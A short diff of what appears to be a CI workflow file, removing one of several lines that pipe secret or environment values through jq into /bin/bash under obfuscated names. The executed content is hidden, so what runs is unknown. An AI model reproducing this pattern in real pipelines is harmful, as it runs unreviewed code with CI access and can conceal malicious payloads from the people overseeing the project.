@@ -23,7 +23,6 @@ jobs:
           o76: ${{ secrets.o76 }}
         run: |
           printf '%s' "$o76" | jq -r .fsbbj6340 | /bin/bash
-          echo $x86 | jq -r .iaw5 | /bin/bash
           echo $inyco8448 | jq -r .aa4332 | /bin/bash
           echo $t614 | jq -r .qtslv8116 | /bin/bash
           printf '%s' "$jn4" | jq -r .b21 | /bin/bash
